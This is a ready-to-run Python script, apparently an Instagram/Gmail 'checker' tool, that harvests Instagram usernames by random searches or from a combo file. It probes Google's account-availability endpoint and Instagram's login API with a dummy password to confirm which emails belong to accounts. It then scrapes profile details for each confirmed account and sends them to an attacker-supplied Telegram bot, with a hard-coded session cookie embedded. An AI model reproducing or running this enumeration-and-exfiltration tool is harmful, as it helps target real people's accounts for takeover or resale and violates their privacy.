import requests,os,random,time,json
from uuid import uuid4
uid = uuid4()
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'



br=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 12; zh-CN; Infinix X663 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 HiBrowser/v2.6.4.1 UWS/ Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; TECNO LG7n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; TECNO LG7n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36']
ag=random.choice(br)
print(C1+f''' 888888b.   8888888b.  
888  "88b  888   Y88b 
888  .88P  888    888 
8888888K.  888   d88P 
888  "Y88b 8888888P"  
888    888 888 T88b   
888   d88P 888  T88b  
8888888P"  888   T88b 
{X}py:@b_4qr {Y}ch:@baqertools ''')
uid = uuid4()
token = input(Z+'❤ '+B+'TOK BOT '+C1+'    : '+Y)

ID = input(Z+'❤ '+B+'ID TELLE '+C1+' : '+Y)

sid = input(Z+'❤ '+B+'SISSON '+C1+' : '+Y)
print(B+'PLASE WAIT')

os.system('clear')
YY =0
head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
def check(email,user): 
 user=str(user)
 email=str(email)

 global YY
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'b_4qrb_4qr',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 try:
 	req= requests.post(url, headers=headers, data=data).json()
 	if req['message'] == 'The password you entered is incorrect. Please try again.':
 	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
 	 nam = str(rr['graphql']['user']['full_name'])
 	 iddd = str(rr['graphql']['user']['id'])
 	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
 	 fols =str(rr['graphql']['user']['edge_follow']['count'])
 	 isp = str(rr['graphql']['user']['is_private'])
 	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
 	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
 	 ree = re.json()
 	 dat = ree['date']
 	 YY+=1
 	 tlg =(f"""
❤ Hit : {YY}
❤ Name : {nam}
❤ UserName : {user}
❤ Email : {email}
❤ ID : {iddd}
❤ Followers : {fol}
❤ Following : {fols}
❤ Private : {isp}
❤ Data : {dat}
❤ Posts : {bio}
❤ Link : https://www.instagram.com/{user}
❤Py : @b_4qr""")
 	 print('IG✅'+F+email)
 	 print(C1+tlg)
   
   
 	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 	 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
 	 	print(Z+'IG❌'+Z+email)
 except json.decoder.JSONDecodeError:
 	print(Z+'IG❌'+Z+email)

def yahoo(email,user):
  global i
  
  
  eml=str(email)
  email=eml.split('@')[0]+'@gmail.com'
  url = 'https://android.clients.google.com/setup/checkavail'
  h = {
    'Content-Length':'98',
    'Content-Type':'text/plain; charset=UTF-8',
    'Host':'android.clients.google.com',
    'Connection':'Keep-Alive',
    'user-agent':ag,
    }
  d = json.dumps({
    'username':email,
    'version':'3',
    'firstName':'AbaLahb',
    'lastName':'AbuJahl'
  })
  try:
  	res = requests.post(url,data=d,headers=h)
  	if res.json()['status'] == 'SUCCESS':
  	 print(f'{F}GM ✅{F} {email}')
  	 check(email,user)
  	else:
  		print(f'{Z}GM ❌{Z} {email}')
  except requests.exceptions.ConnectionError:
  	print(X+'wifi is wack😭')
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='6789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    if '_' in str(email):
      
      continue
    else :
      
      yahoo(email,user)
  except IndexError:
   users()
def users1():
 HR=input('Enter file name :')
 rfile = open(HR, 'r')
 while True:
 	try:
 		emai= rfile.readline().split('\n')[0]
 		if emai =='':
 			print('End combo')
 			exit()
 		else:
 			email=emai+'@gmail.com'
 			if '_' in str(email):
 				continue
 			else :
 				user=emai
 				yahoo(email,user)
 	except IndexError:
 		users1()
def baqer():
	print(C1+f''' 888888b.   8888888b.  
888  "88b  888   Y88b 
888  .88P  888    888 
8888888K.  888   d88P 
888  "Y88b 8888888P"  
888    888 888 T88b   
888   d88P 888  T88b  
8888888P"  888   T88b 
{X}py:@b_4qr {Y}ch:@baqertools ''')
	print('[1]-serch IG \n[2]-Combo user\n')
	chi=input('chose :')
	if chi =='1':
		users()
	elif chi =='2':
		users1()
baqer()
